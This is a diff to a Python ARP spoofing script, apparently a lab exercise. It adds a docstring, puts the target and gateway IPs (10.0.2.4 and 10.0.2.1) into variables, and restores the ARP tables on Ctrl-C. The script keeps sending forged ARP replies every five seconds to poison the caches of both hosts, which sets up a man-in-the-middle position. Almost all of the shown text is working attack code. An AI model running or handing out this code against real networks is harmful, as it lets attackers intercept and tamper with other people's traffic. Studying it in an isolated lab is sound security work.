@@ -34,6 +34,13 @@ def spoof(target_ip, spoof_ip):
     send(packet, verbose=False)
 
 def restore(dest_ip, src_ip):
+    '''
+        Restore ARP Tables
+
+        Parameters:
+            dest_ip - destination IP address 
+            src_ip - source IP address
+    '''
     dest_mac = get_mac(dest_ip)
     src_mac = get_mac(src_ip)
     packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
@@ -41,14 +48,18 @@ def restore(dest_ip, src_ip):
 
 if __name__ == "__main__":
     sent_packets = 0
+    target_ip = '10.0.2.4'
+    gateway_ip = '10.0.2.1'
 
     while True:
         try:
-            spoof('10.0.2.4', '10.0.2.1')
-            spoof('10.0.2.1', '10.0.2.4')
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
             sent_packets += 2
             print(f"\r[+] Packets sent: {sent_packets}", end='', flush=True)
             time.sleep(5)
         except KeyboardInterrupt:
-            print("\n[+] Detected Keyboard Interrupt. Quitting...")
+            print("\n[+] Detected Keyboard Interrupt. Resetting ARP table...")
+            restore(target_ip, gateway_ip)
+            restore(gateway_ip, target_ip)
             break
